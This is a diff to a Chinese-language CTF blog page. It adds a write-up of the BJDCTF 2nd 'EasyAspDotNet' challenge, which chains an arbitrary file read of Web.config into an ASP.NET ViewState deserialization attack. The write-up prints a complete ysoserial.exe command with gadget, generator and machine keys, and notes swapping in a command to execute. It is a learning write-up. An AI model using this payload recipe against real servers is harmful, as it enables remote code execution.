@@ -522,6 +522,22 @@ if (isset($_GET['decrypt'])) {
 本地跑下就能知道结果<br>
 <img src="https://guokeya.github.io/post-images/1584923217521.png" alt="" loading="lazy"><br>
 得到密钥。删除PHPSESSION。URL编码。得到flag</p>
+<p><strong>[BJDCTF 2nd]EasyAspDotNet</strong><br>
+首先图片的URL。可以知道这是个任意文件读取。然后搜到关键文件Web.config<br>
+至此。得到源码和web.config。<br>
+<img src="https://guokeya.github.io/post-images/1584963272305.png" alt="" loading="lazy"><br>
+页面中发现两个隐藏的值。搜了下有个反序列化漏洞<br>
+<img src="https://guokeya.github.io/post-images/1584963304773.png" alt="" loading="lazy"><br>
+照着嘶吼的一篇文章复现。没复现成功。<br>
+赛后赵总给出了个博客<br>
+<code>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</code><br>
+构造里面的payload即可。。修改key</p>
+<pre><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;./dll/System.dll;./dll/System.Web.dll&quot; --generator=&quot;CA0B0334&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey=&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot;
+</code></pre>
+<p>得到反序列化的PAYLOAD<br>
+URL编码其中的加号等<br>
+替换执行命令<br>
+<img src="https://guokeya.github.io/post-images/1584963456024.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
